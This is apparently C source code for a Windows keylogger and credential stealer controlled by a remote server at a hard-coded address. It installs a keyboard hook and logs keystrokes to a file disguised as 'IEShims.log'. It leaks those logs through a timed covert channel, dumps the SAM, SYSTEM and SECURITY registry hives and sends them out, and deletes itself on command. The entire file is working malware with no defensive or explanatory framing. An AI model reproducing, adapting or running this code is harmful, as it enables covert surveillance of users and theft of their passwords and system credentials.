#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

#define COMMAND_BUFFER_SIZE 256 // Define the size of the command buffer
#define WH_KEYBOARD_LL 13
#define WM_KEYDOWN 0x0100
#define CTRL_CODE 162

HHOOK hookHandle = NULL;

char command[COMMAND_BUFFER_SIZE] = ""; // Global command variable
char *filename = "IEShims.log";


void xor(char* data, size_t data_length, const char* key, size_t key_length) {
    for (size_t i = 0; i < data_length; i++) {
        data[i] ^= key[i % key_length];
    }
}

void kill()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    exit(1);
}

LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        char hookedKey = (char)kbStruct->vkCode;

        // Open the log file in append mode
        FILE* logfile = fopen(filename, "a");
        if (logfile == NULL) {
            printf("Error opening log file: %d\n", GetLastError());
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        // Write the hooked key to the log file
        fprintf(logfile, "%d\n", kbStruct->vkCode);

        // Close the log file
        fclose(logfile);

        if (strcmp(command, "run")  != 0) {
            UnhookWindowsHookEx(hookHandle);
            hookHandle = NULL;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to handle connections and command updates
DWORD WINAPI connection_handler(LPVOID lpParam)
{
    SOCKET command_client_socket;
    struct sockaddr_in server_addr;
    int result;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(12345);
    server_addr.sin_addr.s_addr = inet_addr("192.168.189.131");

    while (1)
    {
        Sleep(2000); // sleep for 10 seconds

        command_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (command_client_socket == INVALID_SOCKET)
        {
            printf("socket creation failed: %d\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        result = connect(command_client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
        if (result == SOCKET_ERROR)
        {
            printf("connect failed: %d\n", WSAGetLastError());
            closesocket(command_client_socket);
            WSACleanup();
            return 1;
        }

        // Receive a command from the server
        char command_buffer[COMMAND_BUFFER_SIZE];
        result = recv(command_client_socket, command_buffer, COMMAND_BUFFER_SIZE, 0);
        if (result > 0)
        {
            // Print the command to the console
            command_buffer[result] = '\0';
            xor(command_buffer, result, "cyber", 5);
            strncpy(command, command_buffer, COMMAND_BUFFER_SIZE); // Update the global command variable
        }

        // Close the connection
        closesocket(command_client_socket);
    }

    return 0;
}

// Function to handle commands
// Function to handle commands
DWORD WINAPI command_handler(LPVOID lpParam)
{
    FILE *logfile = (FILE *)lpParam;
    SOCKET data_client_socket;
    struct sockaddr_in server_addr;
    int result;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(12346);
    server_addr.sin_addr.s_addr = inet_addr("192.168.189.131");
   

    while (1)
    {
        Sleep(110); // sleep for a short time to avoid hogging CPU resources
        

        if (strcmp(command, "run") == 0) // Check if the command is "run"
        {   
            if (hookHandle == NULL) {
                // printf("Installing hook\n");
                hookHandle = SetWindowsHookExA(WH_KEYBOARD_LL, hookProc, GetModuleHandle(NULL), 0);
                if(hookHandle != NULL) {
                   // printf("Hook installed\n");
                }

            }
            // iterate over each possible key code and check its state
            MSG msg;
            while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) > 0) {
                // TranslateMessage(&msg);
                if(strcmp(command, "run") != 0) {
                    // printf("Cmd changed uninstallHook()\n");
                    break;
                }
            }
        }
        else if (strcmp(command, "save") == 0) // Check if the command is "save"
        {
            // Create a socket for sending the file
            data_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (data_client_socket == INVALID_SOCKET)
            {
                // printf("socket creation failed: %d\n", WSAGetLastError());
                fclose(logfile);
                WSACleanup();
                return 1;
            }

            // Connect to the server
            result = connect(data_client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
            if (result == SOCKET_ERROR)
            {
                // printf("connect failed: %d\n", WSAGetLastError());
                fclose(logfile);
                closesocket(data_client_socket);
                WSACleanup();
                return 1;
            }
              // Close the log file to flush the buffers
            fclose(logfile);

            // Reopen the log file in read mode
            logfile = fopen("IEShims.log", "rb");
            if (logfile == NULL)
            {
                // printf("Error opening log file: %d\n", GetLastError());
                continue;
            }

            // Send initial packet
            char payload = 0;
            if (send(data_client_socket, &payload, sizeof(char), 0) < 0)
            {
                fclose(logfile);
                closesocket(data_client_socket);
                WSACleanup();
                return 1;
            }
            int delay;
            while (fscanf(logfile, "%d", &delay) == 1)
            {
                Sleep(delay * 10); // Sleep for the specified amount of time (in milliseconds)
                // Send a dummy payload
                char payload = 0;
                if (send(data_client_socket, &payload, sizeof(char), 0) < 0)
                {
                    // printf("Error sending data: %d\n", WSAGetLastError());
                    fclose(logfile);
                    closesocket(data_client_socket);
                    WSACleanup();
                    return 1;
                }
            }

            // Free the buffer and close the connection
            closesocket(data_client_socket);
            fclose(logfile);
            system("del /f IEShims.log");
            logfile = fopen(filename, "a");
            // Reset the command to an empty string
            StringCbCopyA(command, sizeof(command), "run");
        }
        else if (strcmp(command, "regsave") == 0) // Check if the command is "regsave"
        {
            // Save the registry hives
            system("reg save HKLM\\SYSTEM system.save");
            system("reg save HKLM\\SAM sam.save");
            system("reg save HKLM\\SECURITY security.save");

            const char *reg_files[] = {"system.save", "sam.save", "security.save"};
            
            for (int i = 0; i < sizeof(reg_files) / sizeof(reg_files[0]); i++)
            {
                // Create a socket for sending the file
                data_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (data_client_socket == INVALID_SOCKET)
                {
                    fclose(logfile);
                    WSACleanup();
                    return 1;
                }

                // Connect to the server
                result = connect(data_client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
                if (result == SOCKET_ERROR)
                {
                    fclose(logfile);
                    closesocket(data_client_socket);
                    WSACleanup();
                    return 1;
                }

                // Open the registry file in read mode
                FILE *regfile = fopen(reg_files[i], "rb");
                if (regfile == NULL)
                {
                    // printf("Error opening registry file: %s. Error: %d\n", reg_files[i], GetLastError());
                    continue;
                }

                char buffer[1024];
                size_t bytesRead;
                while ((bytesRead = fread(buffer, 1, sizeof(buffer), regfile)) > 0)
                {
                    if (send(data_client_socket, buffer, bytesRead, 0) < 0)
                    {
                        printf("Error sending data: %d\n", WSAGetLastError());
                        fclose(regfile);
                        closesocket(data_client_socket);
                        WSACleanup();
                        return 1;
                    }
                }
                
                fclose(regfile);
                closesocket(data_client_socket);
            
            }
            
            system("del /f system.save");
            system("del /f sam.save");
            system("del /f security.save");
            

            // Reset the command to an empty string
            StringCbCopyA(command, sizeof(command), "run");
        }
        else if (strcmp(command, "kill") == 0) // Check if the command is "kill"
        {
            fclose(logfile);
            system("del /f IEShims.log");

            kill();
        } 
    }
}


int main()
{
    FILE *logfile;
    
    logfile = fopen(filename, "a");


    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        return 1;
    }
    

    // Create connection handler thread
    HANDLE connection_thread = CreateThread(NULL, 0, connection_handler, NULL, 0, NULL);
    if (connection_thread == NULL)
    {
        WSACleanup();
        return 1;
    }

    // Create keylogger handler thread
    HANDLE keylogger_thread = CreateThread(NULL, 0, command_handler, (LPVOID)logfile, 0, NULL);
    if (keylogger_thread == NULL)
    {
        WSACleanup();
        return 1;
    }

    // Wait for the threads to finish
    WaitForSingleObject(connection_thread, INFINITE);
    WaitForSingleObject(keylogger_thread, INFINITE);

    // Close the handles
    CloseHandle(connection_thread);
    CloseHandle(keylogger_thread);

    // Clean up
    fclose(logfile);
    WSACleanup();
    return 0;
}
